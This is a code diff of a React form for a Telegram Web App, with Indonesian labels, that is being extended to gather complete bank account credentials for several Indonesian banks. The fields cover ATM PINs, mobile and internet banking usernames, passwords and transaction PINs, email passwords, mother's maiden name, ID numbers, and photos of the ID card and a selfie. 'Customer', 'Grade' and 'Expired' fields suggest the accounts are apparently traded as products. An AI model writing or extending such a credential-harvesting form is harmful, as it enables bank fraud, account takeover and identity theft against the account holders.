@@ -4,7 +4,6 @@ import './Dashboard.css';
 
 function TelegramProductForm() {
   const [tgUser, setTgUser] = useState(null);
-  const [bank, setBank] = useState('');
   const [form, setForm] = useState({
     customer: '',
     bank: '',
@@ -26,10 +25,20 @@ function TelegramProductForm() {
     expired: '',
     myBCAUser: '',
     myBCAPassword: '',
+    myBCAPin: '',
+    kodeAkses: '',
+    pinMBca: '',
     brimoUser: '',
     brimoPassword: '',
     briMerchantUser: '',
-    briMerchantPassword: ''
+    briMerchantPassword: '',
+    jenisRekening: '',
+    mobileUser: '',
+    mobilePassword: '',
+    mobilePin: '',
+    ibUser: '',
+    ibPassword: '',
+    ibPin: ''
   });
   const [fotoKTP, setFotoKTP] = useState(null);
   const [fotoSelfie, setFotoSelfie] = useState(null);
@@ -44,10 +53,17 @@ function TelegramProductForm() {
     }
   }, []);
 
+  const handleChange = (e) => {
+    const { name, value } = e.target;
+    setForm(prev => ({ ...prev, [name]: value }));
+  };
+
   const handleSubmit = async () => {
     try {
       const fd = new FormData();
-      Object.entries(form).forEach(([k, v]) => fd.append(k, v));
+      Object.entries(form).forEach(([k, v]) => {
+        if (v !== '') fd.append(k, v);
+      });
       if (fotoKTP) fd.append('uploadFotoId', fotoKTP);
       if (fotoSelfie) fd.append('uploadFotoSelfie', fotoSelfie);
 
@@ -70,6 +86,50 @@ function TelegramProductForm() {
     }
   };
 
+  const renderBankFields = () => {
+    const b = (form.bank || '').toUpperCase();
+    if (b === 'BCA') {
+      return (
+        <>
+          <input name="kodeAkses" placeholder="Kode Akses (BCA)" value={form.kodeAkses} onChange={handleChange} />
+          <input name="pinMBca" placeholder="PIN m-BCA" value={form.pinMBca} onChange={handleChange} />
+          <input name="myBCAUser" placeholder="BCA-ID" value={form.myBCAUser} onChange={handleChange} />
+          <input name="myBCAPassword" placeholder="Password BCA-ID" type="password" value={form.myBCAPassword} onChange={handleChange} />
+          <input name="myBCAPin" placeholder="PIN Transaksi (BCA)" value={form.myBCAPin} onChange={handleChange} />
+        </>
+      );
+    } else if (b === 'BRI') {
+      return (
+        <>
+          <input name="brimoUser" placeholder="User BRImo" value={form.brimoUser} onChange={handleChange} />
+          <input name="brimoPassword" placeholder="Password BRImo" type="password" value={form.brimoPassword} onChange={handleChange} />
+          <input name="briMerchantUser" placeholder="User BRI Merchant" value={form.briMerchantUser} onChange={handleChange} />
+          <input name="briMerchantPassword" placeholder="Password BRI Merchant" type="password" value={form.briMerchantPassword} onChange={handleChange} />
+          <input name="jenisRekening" placeholder="Jenis Rekening (Britama/Simpedes)" value={form.jenisRekening} onChange={handleChange} />
+        </>
+      );
+    } else if (b === 'BNI') {
+      return (
+        <>
+          <input name="pinWondr" placeholder="PIN Wondr" value={form.pinWondr} onChange={handleChange} />
+          <input name="passWondr" placeholder="Password Wondr" type="password" value={form.passWondr} onChange={handleChange} />
+        </>
+      );
+    } else if (form.bank !== '') {
+      return (
+        <>
+          <input name="mobileUser" placeholder="Username Mobile Banking" value={form.mobileUser} onChange={handleChange} />
+          <input name="mobilePassword" placeholder="Password Mobile Banking" type="password" value={form.mobilePassword} onChange={handleChange} />
+          <input name="mobilePin" placeholder="PIN Mobile Banking" value={form.mobilePin} onChange={handleChange} />
+          <input name="ibUser" placeholder="Username I-Banking" value={form.ibUser} onChange={handleChange} />
+          <input name="ibPassword" placeholder="Password I-Banking" type="password" value={form.ibPassword} onChange={handleChange} />
+          <input name="ibPin" placeholder="PIN I-Banking" value={form.ibPin} onChange={handleChange} />
+        </>
+      );
+    }
+    return null;
+  };
+
   return (
     <div className="dashboard-container">
       <h2>Form Input Produk (Telegram Web App)</h2>
@@ -83,45 +143,38 @@ function TelegramProductForm() {
       )}
       <div className="card">
         <div style={{ display: 'grid', gap: 12 }}>
-          <input placeholder="Customer" value={form.customer} onChange={e => setForm({ ...form, customer: e.target.value })} />
-          <select value={form.bank} onChange={e => { setForm({ ...form, bank: e.target.value }); setBank(e.target.value) }}>
+          <input name="customer" placeholder="Customer" value={form.customer} onChange={handleChange} />
+          <select name="bank" value={form.bank} onChange={handleChange}>
             <option value="">Pilih Bank</option>
             <option value="BCA">BCA</option>
             <option value="BRI">BRI</option>
+            <option value="BNI">BNI</option>
+            <option value="MANDIRI">MANDIRI</option>
+            <option value="DANAMON">DANAMON</option>
+            <option value="LAINNYA">LAINNYA</option>
           </select>
-          <input placeholder="Grade" value={form.grade} onChange={e => setForm({ ...form, grade: e.target.value })} />
-          <input placeholder="Kantor Cabang" value={form.kcp} onChange={e => setForm({ ...form, kcp: e.target.value })} />
-          <input placeholder="NIK" value={form.nik} onChange={e => setForm({ ...form, nik: e.target.value })} />
-          <input placeholder="Nama" value={form.nama} onChange={e => setForm({ ...form, nama: e.target.value })} />
-          <input placeholder="Nama Ibu Kandung" value={form.namaIbuKandung} onChange={e => setForm({ ...form, namaIbuKandung: e.target.value })} />
-          <input placeholder="Tempat/Tanggal Lahir" value={form.tempatTanggalLahir} onChange={e => setForm({ ...form, tempatTanggalLahir: e.target.value })} />
-          <input placeholder="No. Rekening" value={form.noRek} onChange={e => setForm({ ...form, noRek: e.target.value })} />
-          <input placeholder="No. ATM" value={form.noAtm} onChange={e => setForm({ ...form, noAtm: e.target.value })} />
-          <input placeholder="Valid Kartu" value={form.validThru} onChange={e => setForm({ ...form, validThru: e.target.value })} />
-          <input placeholder="No. HP" value={form.noHp} onChange={e => setForm({ ...form, noHp: e.target.value })} />
-          <input placeholder="PIN ATM" value={form.pinAtm} onChange={e => setForm({ ...form, pinAtm: e.target.value })} />
-          <input placeholder="PIN Wondr" value={form.pinWondr} onChange={e => setForm({ ...form, pinWondr: e.target.value })} />
-          <input placeholder="Password Wondr" type="password" value={form.passWondr} onChange={e => setForm({ ...form, passWondr: e.target.value })} />
-          <input placeholder="Email" type="email" value={form.email} onChange={e => setForm({ ...form, email: e.target.value })} />
-          <input placeholder="Password Email" type="password" value={form.passEmail} onChange={e => setForm({ ...form, passEmail: e.target.value })} />
-          <input placeholder="Expired (YYYY-MM-DD)" value={form.expired} onChange={e => setForm({ ...form, expired: e.target.value })} />
-          {bank === 'BCA' && (
+          {form.bank !== '' && (
             <>
-              <input placeholder="User myBCA" value={form.myBCAUser} onChange={e => setForm({ ...form, myBCAUser: e.target.value })} />
-              <input placeholder="Password myBCA" type="password" value={form.myBCAPassword} onChange={e => setForm({ ...form, myBCAPassword: e.target.value })} />
+              <input name="grade" placeholder="Grade" value={form.grade} onChange={handleChange} />
+              <input name="kcp" placeholder="Kantor Cabang" value={form.kcp} onChange={handleChange} />
+              <input name="nik" placeholder="NIK" value={form.nik} onChange={handleChange} />
+              <input name="nama" placeholder="Nama (Sesuai KTP)" value={form.nama} onChange={handleChange} />
+              <input name="namaIbuKandung" placeholder="Nama Ibu Kandung" value={form.namaIbuKandung} onChange={handleChange} />
+              <input name="tempatTanggalLahir" placeholder="Tempat/Tanggal Lahir" value={form.tempatTanggalLahir} onChange={handleChange} />
+              <input name="noRek" placeholder="No. Rekening" value={form.noRek} onChange={handleChange} />
+              <input name="noAtm" placeholder="No. ATM" value={form.noAtm} onChange={handleChange} />
+              <input name="validThru" placeholder="Valid Kartu (MM/YY)" value={form.validThru} onChange={handleChange} />
+              <input name="noHp" placeholder="No. HP Terdaftar" value={form.noHp} onChange={handleChange} />
+              <input name="pinAtm" placeholder="PIN ATM" value={form.pinAtm} onChange={handleChange} />
+              <input name="email" placeholder="Email" type="email" value={form.email} onChange={handleChange} />
+              <input name="passEmail" placeholder="Password Email" type="password" value={form.passEmail} onChange={handleChange} />
+              <input name="expired" placeholder="Expired (YYYY-MM-DD)" value={form.expired} onChange={handleChange} />
+              {renderBankFields()}
+              <label>Upload Foto KTP: <input type="file" accept="image/*" onChange={e => setFotoKTP(e.target.files[0] || null)} /></label>
+              <label>Upload Foto Selfie: <input type="file" accept="image/*" onChange={e => setFotoSelfie(e.target.files[0] || null)} /></label>
+              <button onClick={handleSubmit}>Kirim</button>
             </>
           )}
-          {bank === 'BRI' && (
-            <>
-              <input placeholder="User BRImo" value={form.brimoUser} onChange={e => setForm({ ...form, brimoUser: e.target.value })} />
-              <input placeholder="Password BRImo" type="password" value={form.brimoPassword} onChange={e => setForm({ ...form, brimoPassword: e.target.value })} />
-              <input placeholder="User BRI Merchant" value={form.briMerchantUser} onChange={e => setForm({ ...form, briMerchantUser: e.target.value })} />
-              <input placeholder="Password BRI Merchant" type="password" value={form.briMerchantPassword} onChange={e => setForm({ ...form, briMerchantPassword: e.target.value })} />
-            </>
-          )}
-          <label>Upload Foto KTP: <input type="file" accept="image/*" onChange={e => setFotoKTP(e.target.files[0] || null)} /></label>
-          <label>Upload Foto Selfie: <input type="file" accept="image/*" onChange={e => setFotoSelfie(e.target.files[0] || null)} /></label>
-          <button onClick={handleSubmit}>Kirim</button>
           {statusMsg && <p>{statusMsg}</p>}
         </div>
       </div>
